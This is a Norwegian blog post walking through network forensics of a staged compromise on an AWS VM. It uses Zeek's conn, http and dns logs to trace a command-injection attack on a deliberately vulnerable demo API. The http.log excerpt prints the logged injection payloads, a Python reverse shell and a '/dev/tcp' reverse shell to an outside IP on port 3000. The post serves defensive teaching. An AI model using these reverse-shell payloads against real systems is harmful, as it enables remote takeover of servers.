---
tittel: Nettverksanalyse i skyen
beskrivelse: Hvordan kan vi oppdage og analysere nettverkshendelser i skyen?
tags: 
 - post
 - front
date: 2023-03-05
bilde: /img/nettverksrot.jpg
layout: layouts/post.njk
---

I denne posten tester vi nettverksbasert analyse av en skadevareinfeksjon i 
en VM som kjører på AWS. Vi antar at følgende har skjedd. En angriper har på 
mystisk vis skaffet seg tilganng til API-serveren vår kjørt diverse kommandoer der. 
Vi har kjørt en pakkedump 
av trafikken på VM-en, og bruker zeek til å analysere hva som foregår. 

VM-en kjører et API for å generere Chuck Norris-vitser. Denne app'en har en 
injisert sårbarhet som gir angriperen et webshell. Denne demo-app'en kan du 
finne her: [github.com/hakdo/vulnerablenorris](https://github.com/hakdo/vulnerablenorris). Vi bruker tcpdump for å logge nettverksaktivitet på den 
infiserte EC2-instannsen.

## Nedlasting og analyse av datadump
Vi genererer datadumpen ved følgende kommando: 

```
tcpdump -i eth0 -w investigation.pcap
```

Etterpå laster vi ned fila. Dette kan vi for eksempel bruke `scp` til, 
men jeg foretrekker å ganske enkelt kjøre en webserver og laste ned fila via 
nettleseren. Dette oppnår vi enkelt ved hjelp av Python: 

```
sudo python3 -m http.server 80
```
Dette er selvsagt en farlig variant som kjører som root, men det er kun for 
å hente ned fila uten å endre brannmurregler (vi tillater webtrafikk). 

For å få mening ut av datadumpen bruker vi [zeek](https://docs.zeek.org/en/current/quickstart.html#zeek-as-a-command-line-utility). Vi genererer loggfiler basert 
på pcap'en. 

```
2023-03-05_investigation:$ mv ~/Downloads/investigation.pcap .
2023-03-05_investigation:$ zeek -Cr investigation.pcap 
2023-03-05_investigation:$ ls
conn.log		http.log		ssl.log
dhcp.log		investigation.pcap	x509.log
dns.log			ntp.log
files.log		packet_filter.log
```

Første stopp er `conn.log`. Denne fila viser alle nettverkstilkoblingene. 
Vi skal undersøke et par antakelser om sikkerhetsbrudd her: 

- Vi antar at angriperen har direkte fjerntilgang, og dermed er tilkoblet for lengre perioder i gaangen. Vi vil derfor se etter langvarige tcp-sesjoner. 
- Vi har en mistanke om at en sårbarhet i applikasjonen er blitt utnyttet. Vi ønsker derfor å se på http-trafikken. 
- Vi lurer på om angriperen har lastet ned flere verktøy. vi ønnsker derfor også å sjekke DNS-loggen for mistennkelige forespørsler. 

### Langvarige sesjoner
Første stopp er conn.log, og vi bruker verktøyet `zeek-cut` til å 
hente ut det vi er mest interesserte i. Følgende kommando henter ut 
de 10 tilkoblingene med lengst varighet. 

```
zeek-cut -d ts id.orig_h id.orig_p id.resp_h id.resp_p service duration < conn.log | sort -n -r -k 7 |head -n10
```
Resutlatet er som følger: 
```
2023-03-05T21:26:23+0100	18.202.216.51	29442	172.31.6.55	22	-	1386.523980
2023-03-05T21:26:29+0100	18.202.216.51	63325	172.31.6.55	22	-	1369.115168
2023-03-05T21:37:12+0100	212.xxx.xxx.xxx	52300	172.31.6.55	3000	http	370.889356
2023-03-05T21:38:41+0100	172.31.6.55	53000	35.217.6.162	3000	-	281.742295
2023-03-05T21:38:43+0100	212.xxx.xxx.xxx	52310	172.31.6.55	3000	http	279.118042
2023-03-05T21:38:44+0100	212.xxx.xxx.xxx	52311	172.31.6.55	3000	http	279.062357
2023-03-05T21:36:03+0100	212.xxx.xxx.xxx	52297	172.31.6.55	3000	http	156.742007
2023-03-05T21:34:13+0100	212.xxx.xxx.xxx	52290	172.31.6.55	3000	http	136.169114
2023-03-05T21:43:39+0100	212.xxx.xxx.xxx	52350	172.31.6.55	3000	http	70.755425
2023-03-05T21:38:50+0100	172.31.6.55	3000	212.xxx.xxx.xxx	52297	-	68.352013
```
Her er 172.31.6.55 VM-ens interne IP-adresse. 212.xxx... er fra meg selv. 18.202... er fra AWS 
og er min egen SSH-tilkoblinng. Den interessante her er 35.217.6.162. Denne har den interne ip-en 
som opprinnelsesadresse, og trafikken er _utgående_ til 35.217.6.162, mot port 3000. 

Dette er uvanlig, og vi ser også at det ikke er gitt noen "service" for denne trafikken. 

Vi kan filtrere alle tilkoblinger til denne ip-adressen for å få bedre oversikt. Vi ser at vi har 4 
utgående forbindelser til denne ip-en: 

```
2023-03-05_investigation:$ zeek-cut -d ts id.orig_h id.orig_p id.resp_h id.resp_p service duration < conn.log | grep 35.217.6.162
2023-03-05T21:38:41+0100	172.31.6.55	53000	35.217.6.162	3000	-	281.742295
2023-03-05T21:43:40+0100	172.31.6.55	43778	35.217.6.162	3000	-	65.190718
2023-03-05T21:44:57+0100	172.31.6.55	33450	35.217.6.162	3000	-	61.970277
2023-03-05T21:47:33+0100	172.31.6.55	39858	35.217.6.162	3000	-	60.235926
```
Det kan være interessant å se hvor denne ip-en fører uten å kontakte den direkte. Et raskt whois-søk 
viser at dette er en IP fra Google Cloud. 

> Denne loggen gir oss en enkel IoC - en ip-adresse. Vi kan selvsagt blokkere denne i brannmuren, men verdien er ganske begrenset siden det er veldig enkelt for angriperen å bytte til en ny IP, forutsatt at angriperen har en måte å få tilbake kontroll over serveren. 

### http-trafikk
La oss se om vi kan finne mer trafikk relatert til denne indikatoren i http.log. Denne loggen 
inneholder http-trafikk som ikke er kryptert. Vi kan med andre ord lese hele 
forespørselen som er sendt. Igjen er zeek-cut verktøyet vi trenger: 

```
2023-03-05_investigation:$ zeek-cut -d ts id.orig_h method uri< http.log | grep 35.217.6
2023-03-05T21:37:13+0100	212.xxx.xxx.xxx	GET	/dangerzone?category=fashion&&export RHOST="35.217.6.162";export RPORT=3000;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
2023-03-05T21:38:45+0100	212.xxx.xxx.xxx	GET	/dangerzone?category=fashion&&sh -i >& /dev/tcp/35.217.6.162/3000 0>&1
2023-03-05T21:42:56+0100	212.xxx.xxx.xxx	GET	/dangerzone?category=fashion&&sh -i >& /dev/tcp/35.217.6.162/3000 0>&1
2023-03-05T21:43:39+0100	212.xxx.xxx.xxx	GET	/dangerzone?category=fashion&&sh -i >& /dev/tcp/35.217.6.162/3000 0>&1
2023-03-05T21:44:57+0100	212.xxx.xxx.xxx	GET	/dangerzone?category=fashion&&sh -i >& /dev/tcp/35.217.6.162/3000 0>&1
2023-03-05T21:48:39+0100	212.xxx.xxx.xxx	GET	/dangerzone?category=fashion&&sh -i >& /dev/tcp/35.217.6.162/3000 0>&1
2023-03-05T21:49:16+0100	212.xxx.xxx.xxx	GET	/dangerzone?category=fashion&&sh -i >& /dev/tcp/35.217.6.162/3000 0>&1
2023-03-05T21:47:33+0100	212.xxx.xxx.xxx	GET	/dangerzone?category=fashion&&sh -i >& /dev/tcp/35.217.6.162/3000 0>&1
```
Her er det en del interessant! Vi ser at angriperen kommer fra IP-en 212.xxx.... (altså, min IP...). Vi ser også at dette er 
et forsøk på å sende et bash-shell til 35.217.6.162 på port 3000. Dette er altså et shell som sendes til 
angriperens maskin i Google Cloud! At det dreiser seg om et "reverse shell" bekreftes også av et enkelt Google-søk på 
selve angrepslasten (payload) - `sh -i >& /dev/tcp/35.217.6.162/3000 0>&1`.

> Denne loggen gir oss mye nyttig info til å forsvare oss. Vi har her endepunktet som tillater kommandoinjeksjon. Dette endepunktet bør vi fjerne eller oppdatere raskest mulig. Dette vil fjerne sårbarheten som angriperen utnytter, og ha veldig høy verdi for den som forsvarer denne tjenesten.  

### Er det alltid DNS? 
Til slutt ser vi på DNS-tjeneren. DNS er nyttig på to måter her: 

1. Kan vi se om angriperen forsøker å laste ned flere hackerverktøy? 
2. Kan vi finne direkte tilkoblinger til IP-adresser, som ikke er knyttet til et DNS-oppslag? Dette er normalt sett mistenkelig. 

For den første, kan vi liste alla DNS-queries for domene-navnn (filtrerer bort arpa-adresser): 
```
zeek-cut query < dns.log |grep -v arpa|uniq
github.com
api.chucknorris.io
```
Disse to domenene er ikke særlig mistenkelige i sammenhengen. Hva så med direktetilkoblinger til IP-adresser som ikke finnes i 
DNS-responser? Da kan vi gjøre følgende: 

1. Finn alle tilkoblinger for utgående trafikk fra conn.log
2. For alle ip-adresser, sjekk om det finnes en DNS-forespørsel med denne IP-en i svarfeltet
3. Hvis det ikke finnes noen match, marker IP-adressen som mistenkelig

Som to eksempler kan vi list alle ip-ene vi har utgående trafikk mot. Vi oppdager 104.21.41.162, og 35.217.6.162. 

La oss først sjekke om den første finnes i et svar på en DNS-forspørsel: 
```
zeek-cut query answers < dns.log|grep 140.82.121.3
github.com	140.82.121.3
```
Dette er altså Github - ikke mistenkelig - mens 35.217.6.162 ikke gir noen treff i DNS. 

> Denne typen anomalideteksjon er ganske "støyete" og man vil typisk ha en del trafikk som går utenom DNS, for eksempel til metadata-endepunkter for skyleverandøren. Det vil typisk også være en del trafikk til interne ip-er i samme virtuelle nettverk. 

## Oppsummert
Nettverksanalyser er nyttige også for skytjenester. Normalt sett vil man enten bruke en nettverksbasert IDS direkte, eller 
hente ut pakker midlertidig ved hjelp av en tjeneste i skyleverandøren. For skempel har AWS mulighet til dette for et 
VPC-nettverk, og Azure gjør det mulig å lagre pcap-filer fra en "Network Watcher". 

Zeek er tiltenkt å bruke til sanntidsanalyser av nettverkstrafikk, hvor loggfilene som gennereres 
sendes til en SIEM, hvor man kan lage deteksjonsregler. Verktøyet er også veldig nyttig til å granske 
nettverkshendelser, og gjør relativt enkle analyser mye lettere å gjennomføre enn ved bruk av verktøy 
for mer direkte analyse av pakkedata, som Wireshark. 

Kort oppsummert er typisk analyseflyt: 
1. Sjekk conn.log for mistenkelige data. Langvarige sesjoner, IP-adresser fra uventede steder er en god start. 
2. Bruk http.log dersom det finnes ukrypterte data. Dette er fortsatt relativt vanlig for en del trusselaktører. 
3. Bruk DNS-loggen for å finne mistennkelige oppslag, og anomalier når sett opp mot conn.log. 
